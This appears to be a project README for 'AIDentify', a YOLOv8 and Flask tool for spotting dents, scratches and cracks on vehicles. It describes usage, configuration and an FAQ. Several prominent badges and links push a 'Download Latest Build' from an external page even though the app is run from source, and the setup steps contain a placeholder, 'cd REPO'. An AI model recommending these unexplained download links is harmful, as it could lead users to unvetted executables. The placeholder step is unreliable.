# AIDentify - Vehicle Damage Detection 2026

> **AIDentify is a browser-based computer vision application that uses YOLOv8 to recognize dents, scratches, cracks, and damaged vehicle components in images, videos, and webcam feeds.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/oliver-lewiscsd9756/aidentify-vehicle-damage?style=flat-square)](https://github.com/oliver-lewiscsd9756/aidentify-vehicle-damage)

---

<p align="center">
  <a href="https://oliver-lewiscsd9756.github.io/aidentify-vehicle-damage/">
    <img src="https://img.shields.io/badge/Download-AIDentify%20Latest-brightgreen?style=for-the-badge" alt="Download AIDentify">
  </a>
</p>

> **[Download AIDentify](https://oliver-lewiscsd9756.github.io/aidentify-vehicle-damage/)**

---

[Download Latest Build](https://oliver-lewiscsd9756.github.io/aidentify-vehicle-damage/)

---

## Overview

AIDentify uses computer vision to assist with vehicle damage inspection. Powered by YOLOv8, it examines uploaded photos, recorded footage, and live webcam input, then outlines recognized damage with bounding boxes and prediction confidence values.

The application is intended for use cases including vehicle inspections and insurance claim assessment. Its stack includes Python, Flask, OpenCV, and PyTorch. The detection model was trained using 778 annotated vehicle images and reports 91.3% mean average precision on its evaluation data.

---

## Capabilities

- Identifies dents, scratches, cracks, and broken vehicle parts
- Works with still images, video files, and webcam input
- Runs inference in real time through a Flask-based web interface
- Marks detected damage with bounding boxes
- Shows confidence scores for individual predictions
- Includes a YOLOv8 model trained on 778 annotated vehicle images
- Reports 91.3% mean average precision
- Allows custom datasets and additional model training

---

## Getting Started

First, download the repository and enter its directory:

```bash
git clone https://github.com/oliver-lewiscsd9756/aidentify-vehicle-damage.git
cd REPO
```

Install the dependencies listed for the project:

```bash
pip install -r requirements.txt
```

Run the Flask server with the application entry point:

```bash
python app.py
```

Visit the local URL printed by Flask. From the browser interface, choose an image, video, or webcam source to begin detection.

---

## Using AIDentify

### Image analysis

1. Run the Flask application.
2. Navigate to the web interface.
3. Upload an image containing a vehicle.
4. Examine the identified regions and their confidence scores.

### Video analysis

1. Start AIDentify.
2. Select the video input workflow.
3. Choose a compatible vehicle-damage video.
4. Review the results while the application processes the video frames.

### Live webcam detection

1. Start the application on your local machine.
2. Allow webcam access in the browser when prompted.
3. Choose the live-stream option.
4. Watch the detected regions and confidence values as inference runs.

### Training with a custom dataset

1. Arrange annotated vehicle images according to the format required by the YOLOv8 training workflow.
2. Modify the dataset and model configuration as needed.
3. Execute the project's training process.
4. Configure the application to use the newly produced model during inference.

---

## Configuration

Keep model and dataset values in the application's project configuration and training configuration. Settings commonly requiring adjustment include the model path, dataset path, input source, confidence threshold, and inference mode.

For example:

```yaml
model: path/to/model.pt
source: path/to/input
confidence: 0.25
mode: image
```

When deploying locally, use the configuration keys and file paths defined by the project.

---

## System Requirements

- A web browser
- Python environment
- Flask
- PyTorch
- OpenCV
- YOLOv8-compatible model files
- Storage for the application, model weights, datasets, and uploaded media
- Webcam access when using live inference

A GPU can help with heavier workloads, although actual processing speed varies according to the available hardware and the selected input source.

---

## Frequently Asked Questions

### Which damage categories are supported?

The included model detects dents, scratches, cracks, and broken vehicle parts.

### Can AIDentify process more than images?

Yes. It accepts still images, video files, and live webcam streams.

### How can I launch the web interface?

Install the Python requirements, execute the Flask entry point, and open the local address displayed in the terminal.

### Does the project support custom training data?

Yes. Custom datasets and model retraining are supported. Annotations and training parameters must conform to the YOLOv8 workflow requirements.

### Where can I view detection output?

The Flask web interface displays the results, including damage bounding boxes and confidence scores.

### What can I troubleshoot if startup fails?

Check that all Python dependencies are installed, the configured model path is valid, and the chosen input source can be accessed. Webcam workflows also require the correct browser permission and device access.

### Where can I find updates?

Review the repository for updated model files, application revisions, and new builds.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
